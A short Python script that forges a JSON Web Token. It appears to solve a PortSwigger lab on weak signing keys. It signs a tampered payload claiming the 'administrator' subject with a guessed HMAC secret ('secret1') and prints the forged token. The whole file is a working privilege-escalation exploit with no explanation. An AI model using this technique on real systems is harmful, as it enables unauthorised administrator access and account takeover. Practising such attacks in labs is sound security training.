import hmac
import hashlib
import base64

JWT_SECRET = "secret1"

def b64(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')

header = '{"kid":"170c351e-58cc-4e4b-9116-6e7924337580","alg":"HS256"}'

tampered_jwt_payload = '{"iss":"portswigger","exp":1772198957,"sub":"administrator"}'

message = f"{b64(header.encode())}.{b64(tampered_jwt_payload.encode())}"

forged_signature = b64(hmac.new(JWT_SECRET.encode(), message.encode(), hashlib.sha256).digest())

admin_jwt = f"{message}.{forged_signature}"

print(admin_jwt)
